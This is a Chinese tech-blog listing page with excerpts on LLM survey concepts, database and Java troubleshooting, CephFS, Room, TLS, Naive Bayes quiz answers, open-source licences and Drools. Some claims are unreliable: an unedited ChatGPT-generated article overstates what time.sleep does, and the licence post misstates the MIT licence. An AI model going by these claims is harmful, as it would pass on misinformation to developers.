在这个表格中，只包括llm和一篇关于技术细节的公开论文。“发布时间”是指论文正式发布的时间。“公开可用”意味着模型检查点可以公开访问，而“封闭源”则意味着相反的意思。“适应性”表示模型是否经过了后续的微调:IT表示指令调整，RLHF表示通过人类反馈进行强化学习。“Evaluation”指的是他们在原文中是否用相应的能力对模型进行了评价:ICL表示上下文学习，CoT表示思维链。“*”表示最大的公开可用版本。 术语来源：近年来，基于大规模语料库的预训练Transformer模型提出了预训练语言模型(pre- training language model, PLMs)，在解决各种自然语言处理(NLP)任务方面表现出了很强的能力。由于研究人员发现模型缩放可以提高模型容量，他们进一步研究了参数缩放到更大的尺寸的缩放效应。有趣的是，当参数规模超过一定水平时，这些扩大的语言模型不仅获得了显著的性能提高，而且还表现出一些小规模语言模型(如BERT)没有的特殊能力(如语境学习)。为了区分不同参数尺度的语言模型，研究界创造了大型语言模型(large language model, LLM)这个术语，用来描述具有显著规模(例如，包含数以百亿或数千亿个参数)的plm。
本文主要内容：本文从llm的研究背景、主要研究成果和主流技术等方面综述了llm研究的最新进展。特别关注llm的四个主要方面，即培训前、适应调整、利用和能力评估。
PART2---Background for LLMs
LLMS的突现能力（Emergent Abilities of LLMs）
LLMS的突现能力被正式定义为“小模型中不存在而在大模型中出现的能力”，这是LLMS（大预言模型）区别于以往PLMS（预训练语言模型）的最显著特征之一。
三种典型的应急能力：
1、情境学习。 GPT-3正式引入了上下文学习(ICL)能力:假设语言模型已经被提供了一个自然语言指令和/或几个任务演示，它可以通过完成输入文本的单词序列为测试实例生成预期的输出，而不需要额外的训练或梯度更新。 在GPT系列模型中，175B GPT-3模型总体上表现出较强的ICL能力，而GPT-1和GPT-2模型则不具备ICL能力。 同时，这种能力还取决于具体的下游任务。 例如，ICL能力可以出现在13B GPT-3的算术任务（如3位数的加减法）上，但175B GPT-3甚至不能很好地工作在波斯语QA任务上。
2、遵循指示。 通过对通过自然语言描述格式化的多任务数据集的混合进行微调（称为指令调优），LLMS在同样以指令形式描述的未见任务上表现良好。 通过指令调优，LLMS能够遵循新任务的任务指令，而无需使用显式示例，从而具有改进的泛化能力。 3、循序渐进的推理。 对于小语言模型，通常很难解决涉及多个推理步骤的复杂任务，如数学单词问题。 而在思想链(COT)提示策略下，LLMS可以利用包含中间推理步骤的提示机制来解决此类任务。 大预言模型的关键技术 （Key Techniques for LLMs.）
1、缩放。 在Transformer语言模型中存在明显的缩放效应：更大的模型/数据大小和更多的训练计算通常会导致更好的模型容量。 作为两个有代表性的模型，GPT-3和Palm分别通过将模型尺寸增加到175B和540B来探索缩放极限。 此外，由于计算预算通常是有限的，可以使用缩放律来进行计算资源的更有效的分配。 但是，需要注意的是，由于预训练数据的质量对模型的容量起着关键作用，所以数据的缩放应该伴随着仔细的清洗过程。
2、训练。 LLMS的网络参数学习需要分布式训练算法，其中常常联合使用多种并行策略。 为了支持分布式训练，一些优化框架已经发布，以促进并行算法的实现和部署，如DeepSpeed和Megatron-LM。 此外，优化技巧对训练稳定性和模型性能也很重要，如克服训练损失尖峰的重启和混合精度训练。 最近，GPT-4提出开发特殊的基础设施和优化方法，以更小的模型可靠地预测大模型的性能。
3、引发的能力（Ability eliciting）。 经过大规模语料库的预训练后，LLMS被赋予了作为通用任务解决者的潜在能力。 然而，当LLMS执行某些特定任务时，这些能力可能不会显式地表现出来。 作为技术途径，设计合适的任务指令或特定的情境学习策略有助于培养这种能力。 例如，Chainof-Think（COT）提示已经被证明通过包含中间推理步骤来解决复杂的推理任务是有用的。 此外，我们还可以用自然语言表达的任务描述对LLMS进行指令调整，以提高LLMS对未知任务的泛化能力。 然而，这些技术主要与LLMS的突现能力相对应，对于小语言模型可能没有同样的效果。
4、对齐调整（Alignment tuning）。 由于LLMS的训练是为了捕捉预训练语料库的数据特征（包括高质量和低质量的数据），它们很可能生成对人类有毒、有偏见甚至有害的内容。 有必要使LLMS与人类价值观相一致，例如，乐于助人、诚实和无害。 为此，InstructGPT[61]设计了一种有效的调谐方法，使LLMS能够遵循预期的指令，该方法利用了带有人类反馈的强化学习技术。 它将人与精心设计的标签策略结合在训练循环中。 ChatGPT实际上是基于与InstructGPT类似的技术开发的，它在产生高质量、无害的回答方面显示出强大的一致性能力，例如拒绝回答侮辱性的问题。
5、工具操作。 本质上，LLMS是在大量纯文本语料库中作为文本生成器进行训练的，因此在非文本形式表达的任务（如数值计算）上表现不佳。 此外，他们的能力也局限于训练前的数据，例如，不能捕捉最新的信息。 为了解决这些问题，最近提出的一种技术是使用外部工具来弥补LLMS的不足。 例如，LLMS可以利用计算器进行精确计算，并使用搜索引擎检索未知信息。 最近，ChatGPT启用了使用外部插件（现有或新创建的应用程序）的机制，这与LLMS的“眼睛和耳朵”类似。 这种机制可以广泛地扩大LLMS的能力范围。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/879009ca020e73289428b5c05815bf10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1935dcaa50f89ebc05c41d51c23fb9b/" rel="bookmark">
			python 部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python 部署 1、首先服务器安装好 python环境，添加好相关的模块（pip install xxx）
2、然后写一个 xxx项目. bat ：python xxxxiangmu.py start
3、在windows计划任务里，创建一个计划任务，触发条件选择开机启动
4、执行程序选择你做的这个xxx项目.bat 这个是windows计划任务
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbd30486f077ba22ddda0a1714c82c2b/" rel="bookmark">
			oracle查看表锁并解锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		oracle查看表锁并解锁 当在一个应用程序能改动数据库，而其他应用程序都不能改动时，基本就说明表被锁了
查看锁 执行命令:select * from v$locked_object;
如果出现表或视图不存在的错误，是因为用户权限不够
以系统身份登陆oracle服务器授权：
grant select any dictionary to 用户名;
再次执行上面的命令：
其中locked_mode的取值为：
0：none
1：null 空
2：Row-S 行共享(RS)：共享表锁，sub share
3：Row-X 行独占(RX)：用于行的修改，sub exclusive
4：Share 共享锁(S)：阻止其他DML操作，share
5：S/Row-X 共享行独占(SRX)：阻止其他事务操作，share/sub exclusive
6：exclusive 独占(X)：独立访问使用，exclusive
直接根据process解锁(Linux:kill -9 10856;Windows:taskkill /pid 10856 /F)就行,如果想查看更详细点的信息，可使用下面两条命令查看：
根据object_id查看表名：select * from user_objects where object_id = 269827;
查看表名被锁的行：select * from ALGOJR_TPARAMETERS for update skip locked;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dc993ffe406edb12b29ac9f90e37bab/" rel="bookmark">
			axios请求参数以 file: (binary)形式发送
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天拿到这么一个接口，第一时间有点懵，因为项目涉及到上传文件之类的一直用的是组件库的upload组件去上传，但是这次需要手动去请求，一直上网搜索如何把文件转为二进制去上传，试了好几次都是失败的，终于找到了答案，这里记录下。
参考组件的upload上传参数，可以看到是这样的：
ok，根据这两个，我们去调整axios请求方式
export const shopCostRecordImport= (params, data) =&gt; { return axios({ method: 'post', url: `****`, params, data, headers: { 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarynl6gT1BKdPWIejNq' } }).then(res =&gt; res.data) }; 其中，要调整content-type，以及对data数据做处理
const formData = new FormData(); formData.append("file", this.fileList[0].originFileObj) // 这里填入你的file文件对象 let params = { month: moment(this.importMonth).format("YYYY-MM"), platformId: this.importPlatformId }; const res = await shopCostRecordImport(params, formData) 这样就可以啦！
总结 content-type设置为: 'multipart/form-data; boundary=----WebKitFormBoundarynl6gT1BKdPWIejNq'数据要通过FormData去处理 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/895dbbd231770b175f3913bd81776fc6/" rel="bookmark">
			Windows 下挂载使用 CephFS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Ceph集群搭建和CephFS创建 参考上期文章
Centos stream 8 使用 cephadm 安装 Ceph (17.2.6 quincy)集群_阿波罗.2012的博客-CSDN博客
二、将CephFS挂载到Windows Server 2019下 1、准备Dokany 下载地址：Release 1.5.1.1000 · dokan-dev/dokany · GitHub
下载1.5.1版本。最新的2.0版本在挂载时会出现一个异常，不知是何原因。
2、下载Ceph for Windows Ceph for Windows MSI安装程序下载地址：Ceph for Windows - Cloudbase Solutions
下载对应的Q版
3、先安装Dokany,再安装Ceph for Windows MSI按提示完成即可。 4、 配置 a、将ceph集群上的ceph.client.admin.keyring文件（该文件通常在/etc/ceph/目录下）拷贝到C:\ProgramData\Ceph文件夹下。
b、在C:\ProgramData\Ceph目录下创建ceph.conf文件，mon host改成ceph节点的地址，内容如下：
# minimal ceph.conf for 9621bcc6-fc83-11ed-9be2-0050568b3a3f [global] log to stderr = true ; Uncomment the following in order to use the Windows Event Log ; log to syslog = true run dir = C:/ProgramData/ceph/out crash dir = C:/ProgramData/ceph/out ; Use the following to change the cephfs client log level ; debug client = 2 [client] keyring = C:/ProgramData/ceph/ceph.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/895dbbd231770b175f3913bd81776fc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35a438b43ebb92fc3a0a502d991eea02/" rel="bookmark">
			FeignClientSpecification的注入原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		研究FeignClient原理的时候遇到一个问题，就是FeignClientSpecification这个类型的bean是如何被注入到Spring的容器中的，花了很多时间才弄明白。
@Configuration @ConditionalOnClass(Feign.class) @EnableConfigurationProperties({FeignClientProperties.class, FeignHttpClientProperties.class}) public class FeignAutoConfiguration { @Autowired(required = false) private List&lt;FeignClientSpecification&gt; configurations = new ArrayList&lt;&gt;(); ... } class FeignClientSpecification implements NamedContextFactory.Specification { private String name; private Class&lt;?&gt;[] configuration; public FeignClientSpecification() {} public FeignClientSpecification(String name, Class&lt;?&gt;[] configuration) { this.name = name; this.configuration = configuration; } FeignAutoConfiguration 是FeignClient的自动配置类，在这个配置bean中注入了FeignClientSpecification类型的所有bean对象。FeignClientSpecification类没有被Spring的@Component、@Configuration等注解标记，而且它没有任何的子类，那么这个类型的bean是如何被注入到Spring容器呢。我当时主要被这里卡住了，没有认识到其实Spring有很多种注册bean的方法，不仅仅局限于使用注解。
class FeignClientsRegistrar implements ImportBeanDefinitionRegistrar, ResourceLoaderAware, BeanClassLoaderAware, EnvironmentAware { // patterned after Spring Integration IntegrationComponentScanRegistrar // and RibbonClientsConfigurationRegistgrar private ResourceLoader resourceLoader; private ClassLoader classLoader; private Environment environment; public FeignClientsRegistrar() { } @Override public void registerBeanDefinitions(AnnotationMetadata metadata, BeanDefinitionRegistry registry) { registerDefaultConfiguration(metadata, registry); registerFeignClients(metadata, registry); } public void registerFeignClients(AnnotationMetadata metadata, BeanDefinitionRegistry registry) { ClassPathScanningCandidateComponentProvider scanner = getScanner(); scanner.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/35a438b43ebb92fc3a0a502d991eea02/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e51319860d0c211f88ea986951575035/" rel="bookmark">
			Druid的数据库连接池技术，两种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		package com3connection; import java.io.InputStream; import java.sql.Connection; import java.sql.SQLException; import java.util.Properties; import javax.sql.DataSource; import org.apache.commons.dbcp.BasicDataSource; import org.junit.Test; import com.alibaba.druid.pool.DruidDataSourceFactory; public class DruidTest { //方式一 @Test public void getConnection1() throws SQLException{ //1、创建连接池 BasicDataSource source=new BasicDataSource(); //2、配置连接信息 source.setUrl("jdbc:mysql://localhost:3306/test"); source.setUsername("root"); source.setPassword("123456789"); source.setDriverClassName("com.mysql.jdbc.Driver"); //3、获取连接 Connection conn=source.getConnection(); System.out.println("数据库连接状态1："+conn); conn.close(); } //方式二 @Test public void getConnection2() throws Exception{ Properties pros = new Properties(); InputStream is = ClassLoader.getSystemClassLoader().getResourceAsStream("druid.properties"); pros.load(is); DataSource source = DruidDataSourceFactory.createDataSource(pros); Connection conn = source.getConnection(); System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e51319860d0c211f88ea986951575035/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1c5027d4de4bb9f8334b968119f6d1ea/" rel="bookmark">
			报错：Servlet.service() for servlet [dispatcherServlet] in context with path [/XXX] threw exception...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言：
报错重点信息：
起因：
解决：
后记：
前言： 先把原因放上来：博主是 数据库 数据丢失的问题，如果确定自己的数据库正确无误的朋友就可以退出寻找其它解决办法了。 报错重点信息： Servlet.service() for servlet [dispatcherServlet] in context with path [/XXX] threw exception [Request processing failed; nested exception is java.lang.NullPointerException] with root cause
起因： 学习spring项目到后期遇到了问题：项目启动后打开页面就会报错，困扰了整整两天。从早到晚排错，整个人精神状态很差。
没办法，因为项目后期整合了太多东西，一个人很难定位到错误发生的根本地方。最后只能还原项目的版本，最终将长篇的报错信息缩小到如下内容：
ERROR [http-nio-8080-exec-1] o.a.c.c.C.[.[.[.[dispatcherServlet] [DirectJDKLog.java:175] Servlet.service() for servlet [dispatcherServlet] in context with path [/XXX] threw exception [Request processing failed; nested exception is java.lang.NullPointerException] with root cause
java.lang.NullPointerException: null
at org.programmer.community.controller.HomeController.getIndexPage(HomeController.java:47)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1c5027d4de4bb9f8334b968119f6d1ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dff77afca3bb0726d7acab3f4893a3f8/" rel="bookmark">
			【Jetpack】使用 Room Migration 升级数据库并导出 Schema 文件 ( Schema 文件简介 | 生成 Schema 文件配置 | 生成 Schema 文件过程 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Schema 文件简介二、生成 Schema 文件配置三、生成 Schema 文件过程1、数据库版本 1 - 首次运行应用2、数据库版本 1 升级至 数据库版本 2 - 第二次运行应用3、数据库版本 2 升级至 数据库版本 3 - 第三次运行应用 一、Schema 文件简介 使用 Room Migration 升级数据库 , 需要根据当前数据库版本和目标版本编写一系列 Migration 迁移类 , 并生成一个升级的 Schema 文件 , 该文件是 json 格式的文件 , 其中包含如下内容 :
版本信息 : 包括 当前版本 和 目标版本 ;创建表语句 : 包括 新增的表的 定义 和 字段信息 ;删除表语句 : 包括 需要删除的 表的名称 ;修改表语句 : 包括 需要修改的表的名称 和 需要修改的字段的定义信息 ;插入数据语句 : 包括 需要插入数据的表的名称 和 插入的数据 ;删除数据语句 : 包括 需要删除数据的表的名称 和 删除的条件 ; Schema 文件是 描述 Room 数据库结构的文件 , 通过该文件 , 可以 很方便地开发者了解数据库的历史变更记录 , 方便排查问题 ;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dff77afca3bb0726d7acab3f4893a3f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f46518efa09999f9184db8b7265dcf73/" rel="bookmark">
			chatgpt赋能python：Python强制等待：如何优化你的Python技能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Python强制等待：如何优化你的Python技能 在Python编程中，强制等待是一种非常重要的程序设计方式。Python代码中的强制等待通常使用time.sleep()方法实现。在本文中，我们将详细介绍什么是Python强制等待，以及如何使用它来优化你的Python技能。
什么是Python强制等待？ 强制等待是一种程序设计方式，它会使程序暂停执行一段指定的时间，直到这段时间结束，程序才会恢复执行。在Python编程中，我们常用time模块的sleep()方法来实现强制等待。
通常情况下，Python程序在执行时需要一定的时间来处理数据或进行其它操作，这就需要程序在一段时间内暂停执行。强制等待的方式可以帮助我们控制程序的执行速度，并确保程序在运行时不会因为某些原因而失去控制。
如何使用Python强制等待？ 在Python编程中，使用强制等待可以通过调用time模块的sleep()方法来实现。sleep()方法接收一个浮点数或整数参数，该参数表示程序暂停执行的时间（单位为秒）。
以下是一个使用强制等待的简单示例：
import time print("开始执行") time.sleep(5) print("程序已暂停5秒钟") 在上面的代码中，程序会先打印出"开始执行"的信息，然后强制等待5秒钟，最后再打印出"程序已暂停5秒钟"的信息。这个例子非常简单，但它展示了如何使用强制等待来控制程序的执行速度。
除了sleep()方法之外，Python还提供了许多其它的时间控制方法。例如，我们可以使用Python的datetime模块来控制时间，并使用time模块的strftime()方法来格式化时间。
强制等待的优点 强制等待是一种非常重要的编程技巧，它可以帮助我们控制程序的执行速度，避免程序在执行时失去控制。以下是一些Python强制等待的优点：
控制程序的执行速度。强制等待可以控制程序的执行速度，帮助我们避免程序在运行时失去控制或崩溃。保证程序执行的正确性。强制等待可以确保程序在执行时不会出现问题，并保证程序所需的时间正确。节省资源。当程序需要执行一些耗时的操作时，强制等待可以帮助我们节省资源，使程序更加高效和稳定。 结论 在Python编程中，强制等待是一种非常重要的程序设计方式，它可以帮助我们掌控程序的执行速度，确保程序在运行时不会失去控制。在本文中，我们介绍了什么是Python强制等待，以及如何使用它来优化你的Python技能。我们还提供了一些使用强制等待的优点，希望这篇文章可以帮助你更好地理解和掌握Python编程中的强制等待技巧。
最后的最后 本文由chatgpt生成，文章没有在chatgpt生成的基础上进行任何的修改。以上只是chatgpt能力的冰山一角。作为通用的Aigc大模型，只是展现它原本的实力。
对于颠覆工作方式的ChatGPT，应该选择拥抱而不是抗拒，未来属于“会用”AI的人。
🧡AI职场汇报智能办公文案写作效率提升教程 🧡 专注于AI+职场+办公方向。
下图是课程的整体大纲
下图是AI职场汇报智能办公文案写作效率提升教程中用到的ai工具
🚀 优质教程分享 🚀 🎄可以学习更多的关于人工只能/Python的相关内容哦！直接点击下面颜色字体就可以跳转啦！ 学习路线指引（点击解锁）知识定位人群定位🧡 AI职场汇报智能办公文案写作效率提升教程 🧡进阶级本课程是AI+职场+办公的完美结合，通过ChatGPT文本创作，一键生成办公文案，结合AI智能写作，轻松搞定多场景文案写作。智能美化PPT,用AI为职场汇报加速。AI神器联动，十倍提升视频创作效率💛Python量化交易实战 💛入门级手把手带你打造一个易扩展、更安全、效率更高的量化交易系统🧡 Python实战微信订餐小程序 🧡进阶级本课程是python flask+微信小程序的完美结合，从项目搭建到腾讯云部署上线，打造一个全栈订餐系统。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3247672ff9b5f6f1cab5b46d3bc419be/" rel="bookmark">
			VC&#43;&#43;中线程局部存储（TLS）的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VC++中线程局部存储（TLS）的使用 线程的局部存储（Thread Local Storage，TLS）是一种线程私有的数据存储方式，每个线程都有自己的局部存储空间，可以在其中存储线程私有的数据。线程的局部存储原理是通过操作系统提供的API实现的，不同的操作系统提供的API可能有所不同，下面以 Windows操作系统为例进行说明。
在Windows操作系统中，线程的局部存储是通过TLS函数实现的。TLS函数包括以下几个步骤：
调用TlsAlloc函数分配一个TLS索引，该索引用于访问线程的局部存储空间。调用TlsSetValue函数将数据存储到线程的局部存储空间中，可以使用任何类型的数据作为线程的局部存储数据。调用TlsGetValue函数从线程的局部存储空间中获取数据。调用TlsFree函数释放线程的局部存储空间。 在使用TLS函数时，需要注意以下几点：
每个线程都有自己的局部存储空间，线程之间的数据不会相互干扰。线程的局部存储空间是在线程创建时分配的，线程退出时释放。线程的局部存储空间大小是固定的，通常为4KB。线程的局部存储空间可以存储任何类型的数据，包括指针、整数、结构体等。 总之，线程的局部存储是一种线程私有的数据存储方式，可以在其中存储线程私有的数据。线程的局部存储原理是通过操作系统提供的API实现的，不同的操作系统提供的API可能有所不同。在使用TLS函数时，需要注意线程之间的数据不会相互干扰，线程的局部存储空间大小是固定的，可以存储任何类型的数据。
下面是一个使用线程局部存储（TLS）编写的Windows C++多线程程序示例：
#include &lt;iostream&gt; #include &lt;Windows.h&gt; #include &lt;string&gt; #include &lt;sstream&gt; // 全局变量，用于记录线程 ID DWORD g_threadId = 0; // 定义线程局部存储 TLS_KEY DWORD tlsKey = TlsAlloc(); /** * 线程入口函数 * 输出 10 次线程 ID 和 TLS 存储的数值 */ DWORD WINAPI ThreadProc(LPVOID lpParameter) { int num = 0; // 设置 TLS 存储的数值 TlsSetValue(tlsKey, new int(1)); for (int i = 0; i &lt; 10; i++) { // 输出线程 ID 和 TLS 存储的数值 std::stringstream ss; ss &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3247672ff9b5f6f1cab5b46d3bc419be/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc7edc7d5f6a838e6ba8de3a87c561c5/" rel="bookmark">
			机器学习--朴素贝叶斯分类器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第1关：条件概率 什么是条件概率
概率指的是某一事件A发生的可能性，表示为P(A)。而条件概率指的是某一事件A已经发生了条件下，另一事件B发生的可能性，表示为P(B|A)，举个例子：
今天有25%的可能性下雨，即P(下雨)=0.25; 今天75%的可能性是晴天，即P(晴天)=0.75; 如果下雨，我有75%的可能性穿外套，即P(穿外套|下雨)=0.75; 如果下雨，我有25%的可能性穿T恤，即P(穿T恤|下雨)=0.25;
从上述例子可以看出，条件概率描述的是|右边的事件已经发生之后，左边的事件发生的可能性，而不是两个事件同时发生的可能性！
1、P(AB)表示的是事件A与事件B同时发生的概率，P(A|B)表示的是事件B已经发生的条件下，事件A发生的概率。
A、对 B、错 2、从1,2,...,15中小明和小红两人各任取一个数字，现已知小明取到的数字是5的倍数，请问小明取到的数大于小红取到的数的概率是多少？
A、7/14 B、8/14 C、9/14 D、10/14 答案：1、A 2、C 第2关：贝叶斯公式 全概率公式：
当为了达到某种目的，但是达到目的有很多种方式，如果想知道通过所有方式能够达到目的的概率是多少的话，就需要用到全概率公式（上面的例子就是这种情况！）。全概率公式的定义如下：
若事件B1​,B2​,...,Bn​两两互不相容，并且其概率和为1。那么对于任意一个事件C都满足：
P(C)=P(B1​)P(C∣B1​)+...+P(Bn​)P(C∣Bn​)=i=1∑n​P(Bi​)P(C∣Bi​)
贝叶斯公式：
当已知引发事件发生的各种原因的概率，想要算该事件发生的概率时，我们可以用全概率公式。但如果现在反过来，已知事件已经发生了，但想要计算引发该事件的各种原因的概率时，我们就需要用到贝叶斯公式了。
贝叶斯公式定义如下，其中A表示已经发生的事件，Bi为导致事件A发生的第i个原因：
P(Bi​∣A)=∑i=1n​P(A∣Bi​)P(Bi​)P(A∣Bi​)P(Bi​)​
贝叶斯公式看起来比较复杂，其实非常简单，分子部分是乘法定理，分母部分是全概率公式（分母等于P(A)）。
如果我们对贝叶斯公式进行一个简单的数学变换（两边同时乘以分母，再两边同时除以P(Bi)）。就能够得到如下公式：
P(A∣Bi​)=P(Bi​)P(Bi​∣A)P(A)​
这个公式是朴素贝叶斯分类算法的核心数学公式。
1、对以往数据分析结果表明，当机器调整得良好时，产品的合格率为98%，而当机器发生某种故障时，产品的合格率为55%。每天早上机器开动时，机器调整得良好的概率为95%。计算已知某日早上第一件产品是合格时，机器调整得良好的概率是多少？
A、0.94 B、0.95 C、0.96 D、0.97 2、一批产品共8件，其中正品6件，次品2件。现不放回地从中取产品两次，每次一件，求第二次取得正品的概率。
A、1/4 B、1/2 C、3/4 D、1 答案：1、D 2、C 第3关：朴素贝叶斯分类算法流程
import numpy as np class NaiveBayesClassifier(object): def __init__(self): ''' self.label_prob表示每种类别在数据中出现的概率 例如，{0:0.333, 1:0.667}表示数据中类别0出现的概率为0.333，类别1的概率为0.667 ''' self.label_prob = {} ''' self.condition_prob表示每种类别确定的条件下各个特征出现的概率 例如训练数据集中的特征为 [[2, 1, 1], [1, 2, 2], [2, 2, 2], [2, 1, 2], [1, 2, 3]] 标签为[1, 0, 1, 0, 1] 那么当标签为0时第0列的值为1的概率为0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc7edc7d5f6a838e6ba8de3a87c561c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/38c1ec6c48a67572ef7055bb1a714e93/" rel="bookmark">
			别人用开源项目赚钱，我却吃上牢饭？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		faker.js一个github上著名的开源项目，上万的star,上亿次的下载量，一夜之间被原作者删除。tiktok突然砍掉了一整个功能模块，这背后到底是人性的扭。。咳，串词了。github是全球最大代买开源平台，里面充斥着各种的开源项目，今天给大家说道说道开源协议。
1.开源=免费？ 很多人，可能看到开源两个字，想到的就是免费。实际上这是错误的，开源项目只是免费下载与使用，在修改与分发这些项目时，仍然要遵守原项目的开源协议。所以，you are not freee。
2.github上有哪些开源协议 github上有非常多开源协议，但是常用的开源协议有以下几种：
2.1GPL协议，可以免费使用，但是如果修改代码必须进行开源，这也是为什么我们能免费的用各种linux。
2.2LGPL协议：你只进行类库引用，可以随意使用。但是你修改了源码就必须公开。
2.3Apache协议：允许修改代码后，闭源不公开，每个修改的地方都要进行说明。
2.4BSD协议：允许修改代码后，闭源，需要保留原来的BSD协议，不能用原作者名字做市场推广。
2.5MIT协议：允许代码修改后闭源，并允许衍生产品用作者名字做市场推广。
2.6None:不允许其他人进行复制、分发、使用与修改。如果上传了GitHub默认允许别人进行查看与fork到自己仓库，只是不能使用与修改。
3.怎么将开源协议作为github的搜索条件 3.1打开以下链接：https://github.com/search
3.2 点击高级搜索
3.3 找到对应的开源协议，作为筛选项。高级搜索不仅能筛选协议，还能根据项目创建时间，作者，编程语言等条件作为筛选条件，建议自己摸索一下。
4.自己的项目如何创建协议 4.1 进入自己项目主页，点击Add file，选择Create new file,进入下一步
4.2输入license点击 Choose a license template
5.我不知道选择什么协议怎么办？ 这种情况，可以不创建开源协议文件。不创建文件代表了上面2.6的None这种情况，只允许他人查看与fork到自己的库，不允许其他人使用与修改，后期决定自己项目的用途了，再进行更改。
开头的fake.js开源作者删除了所有的代码，其中最主要的原因是他使用了 MIT 协议,这种协议无法为他带来任何的效益和获利，他辛辛苦苦维护了十多年的项目，很多开发者与科技巨头都在使用它。但是等到他真正使用钱的时候，却什么也给不了他。tiktok也是因为开源协议的问题，被人逼迫开源代码，然后直接砍掉了整个功能模块。2021年，深圳人民法院就做出了一份关于开源协议侵权的判决。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59f649939c207fb8f46cea860606cb54/" rel="bookmark">
			Drools 规则引擎原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 Drools规则引擎基本定义介绍优劣优点缺点 基本概念规则引擎构成 规则结构规则引擎执行过程规则存储Kie 介绍Kie 相关组件知识库规则引擎与知识库Drools 存储规则的数据结构 Rete 算法原理优缺点优点缺点 举例 前向和后向链推理机制前向链后向链对比 应用场景概念和特点架构和组件使用方法和示例 相关文献资料 基于Java的开源的规则引擎框架有很多，从实现原理上来说分为以下三类： 通过Java语言+RETE算法实现（drools和urule）通过脚本语言+jvm实现（groovy）通过Java表达式+jvm实现(Aviator) Drools规则引擎 基本定义 从“频繁且通用”的业务变化中抽象出来的中间服务层，实现了将决策逻辑从应用代码中分离出来，并使用预定义的高级语法或者可视化的工具编写业务规则并自动优化执行。
规则引擎具体执行可以分为接受数据输入，高效解释业务规则，根据业务规则输出决策结果几个过程。如下图所示：
介绍 Drools规则引擎是一种基于规则的方法，用于在Drools软件中实现专家系统。规则引擎提供了专家系统，这是一种基于知识的系统，可以帮助你做出决策，比如做什么和怎么做。它将知识收集到一个知识库中，可以用于推理。
Drools规则引擎基于以下抽象组件实现：
规则(Rules)：业务规则或DMN决策。所有规则必须至少包含触发该规则的条件以及对应的操作。事实(Facts)：输入到规则引擎的数据，用于规则的条件的匹配。生产内存(Production memory)：规则引擎中规则存储的地方工作内存(Working memory)：规则引擎中Fact对象存储的地方。议程(Agenda)：用于存储被激活的规则的分类和排序的地方。 Drools规则引擎的核心组件有：
• KieFileSystem：一个内存文件系统，用于存储规则文件和其他资源。
• KieContainer：一个包含多个KieBases的容器，每个KieBase代表一个知识库。
• KieSession：一个用于插入事实和触发规则的会话。
• Rule：一个表示单个规则的对象，它包含匹配事实的条件和执行动作的结果。
• Fact：一个表示输入数据的对象，它可以被规则引擎修改、插入或删除。
